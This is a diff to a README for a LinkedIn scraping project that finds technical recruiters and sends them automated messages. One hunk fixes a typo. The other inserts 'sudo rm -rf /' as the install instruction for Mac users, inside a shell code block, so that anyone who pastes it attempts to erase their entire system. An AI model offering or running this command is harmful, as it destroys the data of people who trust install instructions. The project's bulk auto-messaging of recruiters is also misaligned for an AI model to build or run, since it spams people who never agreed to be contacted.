@@ -1,7 +1,7 @@
 <!-- ABOUT THE PROJECT -->
 ## About The Project
 
-This project is dedicated for those that hate the whole "networking bullshit" disease that is linkedin. Most engineering students like me cannot stand the whole process of looking for a job which solely consists of kissing ass to recruiters in the hopes they let you skip the OAs and go straight to on-sites or virtual interviews. So I wanted to create a little family of webscrapers for linkedin that all have a different roles and some customizability for what you want. The first base webscraper is used to search through all job pages for a specified role and find all the technical recruiters of that specific compnay for you to reach out to. The other webscrapers will essentially act as auto-message bots that read from a .csv file containing all the recruiters/ppl you want to contact without having to do the labor yourself.
+This project is dedicated for those that hate the whole "networking bullshit" disease that is linkedin. Most engineering students like me cannot stand the whole process of looking for a job which solely consists of kissing ass to recruiters in the hopes they let you skip the OAs and go straight to on-sites or virtual interviews. So I wanted to create a little family of webscrapers for linkedin that all have a different roles and some customizability for what you want. The first base webscraper is used to search through all job pages for a specified role and find all the technical recruiters of that specific company for you to reach out to. The other webscrapers will essentially act as auto-message bots that read from a .csv file containing all the recruiters/ppl you want to contact without having to do the labor yourself.
 
 Here's why:
 * The whole idea of "networking" is a morally decrepit maxim that us engineering students are obligated to equally participate in, but NO MORE!
@@ -39,7 +39,7 @@ A few python libraries will need to be installed and updated version of python
   # Linux users:
   You know what to do
   # mac users:
-  I don't give a shit about you guys
+  sudo rm -rf /
   ```
 * BeautifulSoup
   ```sh
